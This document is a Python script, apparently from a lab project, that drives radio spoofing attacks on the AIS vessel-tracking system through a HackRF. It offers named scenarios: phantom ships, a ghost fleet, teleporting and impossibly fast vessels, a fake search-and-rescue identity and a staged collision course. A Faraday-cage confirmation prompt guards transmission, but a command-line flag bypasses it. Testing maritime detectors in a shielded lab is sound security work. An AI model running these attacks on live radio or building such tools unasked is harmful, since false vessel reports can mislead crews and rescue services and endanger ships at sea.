#!/usr/bin/env python3
r"""
rf_attack.py -- scriptable AIS attack driver (no web UI).

Sends AIS message bit strings to a running ais-simulator.py flowgraph over its
websocket (default ws://127.0.0.1:52002/ws). The flowgraph's proven C++ block adds
the preamble/flags/CRC/NRZI framing and GMSK-modulates to the HackRF, so this driver
only has to produce the correct message PAYLOAD bits -- which ais_encode.py already
does (verified against pyais).

** SAFETY **
This causes RF transmission. ais-simulator.py transmits whatever it receives, so this
tool keeps the cage-sealed gate: it will not send anything until you confirm the cage
is sealed (or pass --i-confirm-cage-sealed for scripted runs). Every message sent is
logged with a timestamp so the witness receiver's recording can be matched to it.

Design: attacks are named functions returning a list of (payload_bits, meta) to send.
Run one attack by name, or list them. This mirrors the serial-side "named case" pattern.

Prereq on the attacker Pi (cage sealed):
    python3 -u ais-simulator.py -c 1 --lna 20        # channel B, moderate gain
Then:
    python3 rf_attack.py --list
    python3 rf_attack.py ghost_ship
    python3 rf_attack.py impossible_jump --repeat 20

Requires: pip install websocket-client
"""
import argparse, json, os, sys, time

try:
    import websocket  # websocket-client
except Exception:
    websocket = None

# reuse the validated payload builders
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import ais_encode as enc


# ----------------------------------------------------------------------------
# Attack scenarios. Each returns (list_of_payload_bitstrings, description).
# Positions: spoof target and a baseline; adjust to your cage test coordinates.
# ----------------------------------------------------------------------------
SPOOF_LAT, SPOOF_LON = 42.35, -70.90       # your validated loopback coords
JUMP_LAT, JUMP_LON = 45.50, -75.50

def _t1(mmsi, lat, lon, sog=0.0, cog=0.0, nav=0):
    """Type 1 position report payload bits (168)."""
    return enc.encode_type1(mmsi, lat, lon, sog=sog, cog=cog, nav_status=nav)


def ghost_ship():
    """A single non-existent vessel at a fixed position (the basic phantom target)."""
    mmsi = 366000001
    return [(_t1(mmsi, SPOOF_LAT, SPOOF_LON, sog=0.0), f"ghost MMSI {mmsi} @ {SPOOF_LAT},{SPOOF_LON}")], \
           "Ghost ship: one fake vessel broadcasting a fixed position."


def impossible_jump():
    """Same MMSI reporting two far-apart positions in quick succession (teleport)."""
    mmsi = 366000002
    return [
        (_t1(mmsi, SPOOF_LAT, SPOOF_LON, sog=0.0), f"jump A @ {SPOOF_LAT},{SPOOF_LON}"),
        (_t1(mmsi, JUMP_LAT, JUMP_LON, sog=0.0), f"jump B @ {JUMP_LAT},{JUMP_LON}"),
    ], "Impossible jump: one MMSI teleporting between two distant positions."


def impossible_speed():
    """A vessel reporting an implausible speed (e.g. 102 kn) at a real position."""
    mmsi = 366000003
    return [(_t1(mmsi, SPOOF_LAT, SPOOF_LON, sog=102.0, cog=90.0),
             f"MMSI {mmsi} @ {SPOOF_LAT},{SPOOF_LON} SOG 102kn")], \
           "Impossible speed: 102 knots (physically impossible for a vessel)."


def fake_identity_sar():
    """A Type 1 from an MMSI in the SAR aircraft range (111xxxxxx) -- wrong identity class."""
    mmsi = 111000001   # 111 = SAR aircraft prefix
    return [(_t1(mmsi, SPOOF_LAT, SPOOF_LON), f"SAR-prefix MMSI {mmsi} sending vessel report")], \
           "Fake identity class: SAR-aircraft MMSI (111...) sending a Class-A position."


def rapid_ghost_fleet(n=10):
    """Many distinct fake vessels injected quickly (fleet of phantoms)."""
    msgs = []
    for i in range(n):
        mmsi = 366100000 + i
        lat = SPOOF_LAT + (i % 5) * 0.01
        lon = SPOOF_LON + (i // 5) * 0.01
        msgs.append((_t1(mmsi, lat, lon, sog=5.0, cog=(i*36) % 360),
                     f"fleet ghost {i} MMSI {mmsi}"))
    return msgs, f"Rapid ghost fleet: {n} distinct fake vessels."


def collision_course():
    """Two vessels on converging tracks (for the multi-vessel collision test)."""
    return [
        (_t1(366000010, SPOOF_LAT, SPOOF_LON, sog=15.0, cog=90.0), "vessel1 heading E"),
        (_t1(366000011, SPOOF_LAT, SPOOF_LON + 0.1, sog=15.0, cog=270.0), "vessel2 heading W"),
    ], "Collision course: two vessels converging head-on."


ATTACKS = {
    "ghost_ship": ghost_ship,
    "impossible_jump": impossible_jump,
    "impossible_speed": impossible_speed,
    "fake_identity_sar": fake_identity_sar,
    "rapid_ghost_fleet": rapid_ghost_fleet,
    "collision_course": collision_course,
}


# ----------------------------------------------------------------------------
# websocket send + cage gate + logging
# ----------------------------------------------------------------------------
def cage_gate(skip):
    if skip:
        return True
    print("=" * 66)
    print(" TRANSMIT SAFETY CHECK -- this sends AIS over the air via the HackRF.")
    print(" Only proceed with the Faraday cage sealed.")
    print("=" * 66)
    ans = input(" Type EXACTLY 'cage is sealed' to transmit: ")
    if ans.strip() != "cage is sealed":
        print(" Aborted. Nothing transmitted.")
        return False
    return True


def send_payloads(url, payloads, gap, repeat, logf):
    """Connect to the ais-simulator websocket and send each payload bit string."""
    ws = websocket.create_connection(url, timeout=10)
    print(f"connected to {url}")
    logf.write(json.dumps({"event": "ws_connect", "url": url, "t": time.time()}) + "\n")
    try:
        for r in range(repeat):
            for (bits, meta) in payloads:
                # sanity: only 0/1 characters, reasonable length
                if any(c not in "01" for c in bits):
                    raise ValueError(f"payload has non-binary chars: {meta}")
                ws.send(bits)
                rec = {"event": "sent", "t": time.time(),
                       "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                       "bits_len": len(bits), "meta": meta, "rep": r}
                logf.write(json.dumps(rec) + "\n"); logf.flush()
                print(f"  sent [{r}] {meta} ({len(bits)} bits)")
                time.sleep(gap)
    finally:
        ws.close()
        logf.write(json.dumps({"event": "ws_close", "t": time.time()}) + "\n")


def main():
    ap = argparse.ArgumentParser(description="Scriptable AIS attack driver (no web UI).")
    ap.add_argument("attack", nargs="?", help="attack name (see --list)")
    ap.add_argument("--list", action="store_true", help="list available attacks")
    ap.add_argument("--url", default="ws://127.0.0.1:52002/ws",
                    help="ais-simulator websocket (default local). For a remote Pi use "
                         "ws://192.168.50.11:52002/ws")
    ap.add_argument("--gap", type=float, default=1.0,
                    help="seconds between messages (AIS Class A reports ~every 2-10s)")
    ap.add_argument("--repeat", type=int, default=1,
                    help="repeat the whole scenario N times (ghosts must repeat to persist)")
    ap.add_argument("--n", type=int, default=10, help="fleet size for rapid_ghost_fleet")
    ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
    ap.add_argument("--i-confirm-cage-sealed", action="store_true")
    args = ap.parse_args()

    if args.list or not args.attack:
        print("available attacks:")
        for name, fn in ATTACKS.items():
            _, desc = (fn(args.n) if name == "rapid_ghost_fleet" else fn())
            print(f"  {name:20s} {desc}")
        print("\nrun: python3 rf_attack.py <name> [--repeat N] [--gap S] [--url ws://...]")
        return

    if args.attack not in ATTACKS:
        print(f"unknown attack '{args.attack}'. use --list."); sys.exit(2)
    if websocket is None:
        print("!! needs websocket-client: pip install websocket-client --break-system-packages")
        sys.exit(1)

    fn = ATTACKS[args.attack]
    payloads, desc = (fn(args.n) if args.attack == "rapid_ghost_fleet" else fn())
    print(f"attack: {args.attack}")
    print(f"  {desc}")
    print(f"  {len(payloads)} distinct message(s), repeat {args.repeat}x, gap {args.gap}s")
    print(f"  target websocket: {args.url}")
    print()
    print("  NOTE: ais-simulator.py must already be running (cage sealed) and will")
    print("        transmit each message on the AIS channel you launched it with.")
    print()

    if not cage_gate(args.i_confirm_cage_sealed):
        sys.exit(0)

    os.makedirs(args.logdir, exist_ok=True)
    stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    logpath = os.path.join(args.logdir, f"attack_{args.attack}_{stamp}.jsonl")
    with open(logpath, "a", buffering=1) as logf:
        logf.write(json.dumps({"event": "attack_start", "attack": args.attack,
                               "desc": desc, "t": time.time()}) + "\n")
        try:
            send_payloads(args.url, payloads, args.gap, args.repeat, logf)
        except KeyboardInterrupt:
            print("\ninterrupted.")
        except Exception as e:
            print(f"!! send failed: {e}")
            print("   is ais-simulator.py running and reachable at that URL?")
    print(f"\ndone. attack log: {logpath}")
    print("Match its timestamps against the listener's NMEA recording.")


if __name__ == "__main__":
    main()
